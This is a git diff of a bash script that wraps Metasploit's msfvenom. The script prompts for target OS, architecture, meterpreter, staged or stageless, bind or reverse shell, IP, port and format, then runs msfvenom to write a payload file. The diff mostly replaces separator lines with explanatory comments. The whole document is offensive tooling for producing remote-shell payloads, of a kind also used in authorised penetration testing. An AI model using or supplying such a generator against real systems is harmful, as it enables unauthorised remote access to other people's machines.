@@ -1,6 +1,7 @@
 #!/bin/bash
 #A script that creates a wrapper around MSFvenom and allows for easier payload generation.
 
+#Asks user for target operating system and validates entry.
 validate_os(){
 echo "What is the target of your operating system? Example: windows, linux, osx"
 read OS
@@ -15,7 +16,8 @@ esac
 }
 
 validate_os
-###########################################################################
+
+#Asks user for target system architecture and validates user entry.
 validate_arc(){
 echo "Is it 64 bit or 32? Please type 32 or 64."
 read architecture
@@ -30,7 +32,8 @@ esac
 }
 
 validate_arc
-############################################################################
+
+#Sets arc to "" for Windows 32 bit.
 no_arc_display(){
 case $OS in
         windows)
@@ -38,7 +41,8 @@ case $OS in
         ;;
 esac
 }
-#############################################################################
+
+#Asks user whether they would like to have a meterpreter shell and checks whether user input is part of the list.
 meterpreter_question(){
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
 read meterpreter
@@ -51,7 +55,8 @@ case $meterpreter in
 	;;
 esac
 }
-#############################################################################
+
+#Sets meterpreter use to "n" for 32 bit OSX.
 linux_x86_meterpreter(){
 case  $OS in
 	linux|windows)
@@ -62,7 +67,8 @@ case  $OS in
 	;;
 esac
 }
-#############################################################################
+
+#Asks user whether they would like a staged or unstaged payload and validates user input.
 validate_stage(){
 echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless."
 read stage
@@ -77,7 +83,8 @@ esac
 }
 
 validate_stage
-#############################################################################
+
+#Sets symbol depending on whether payload will be staged or unstaged.
 stage_symbol=""
 
 case $stage in
@@ -89,6 +96,7 @@ case $stage in
 	;;
 esac
 
+#Function to determine whether to ask meterpreter question.
 case $architecture in
 	32)
 		arc="/x86"
@@ -101,7 +109,8 @@ case $architecture in
 		meterpreter_question
 	;;
 esac
-############################################################################
+
+#Asks user whether they would like a bind shell or reverse shell and checks for correct entry.
 validate_shell(){
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
 read shell
@@ -116,7 +125,8 @@ esac
 }
 
 validate_shell
-##############################################################################
+
+#Functions to ask user for IP address and validates correct IP.
 correct_ip="false"
 check_ip(){
 octet="(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])"
@@ -135,7 +145,8 @@ do
 	check_ip
 done
 }
-############################################################################
+
+#Functions to ask user for port number and to validate correct port numbers.
 correct_port="false"
 check_port() {
 if [[ $port -gt 65535 ]] || [[ $port -lt 1 ]];
@@ -154,7 +165,7 @@ do
 done
 }
 
-#############################################################################
+#Case questions for users that want bind or reverse shells
 ip_port=""
 
 case $shell in
@@ -173,7 +184,7 @@ case $shell in
         echo "Please enter your target's IP address."
 	read ip
 	check_ip
-        find_correct_ip
+	find_correct_ip
 	echo "Please enter the port you want your target to listen on."
         read port
 	check_port
@@ -181,7 +192,8 @@ case $shell in
 	ip_port="RHOST=$ip RPORT=$port"
     ;;
 esac
-#############################################################################
+
+#Asks user to input file format and validates input.
 validate_form(){
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
 read format
@@ -196,13 +208,16 @@ esac
 }
 
 validate_form
-#############################################################################
-payload=""
-msfgen=""
+
+#Asks user for desired filename.
 
 echo "What would you like to name the file?"
 read filename
-#############################################################################
+
+#Functions for using meterpreter and determining string format
+payload=""
+msfgen=""
+
 use_meterpreter() {
 	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
 }
@@ -224,7 +239,9 @@ case  $meterpreter  in
         ;;
 	*)
 esac
-###############################################################################
+
+#Shows user final payload generating string
 echo "msfvenom -p $msfgen"
 
+#Calls msfvenom directly and generates an output file.
 msfvenom -p $msfgen > ${filename}.${format}
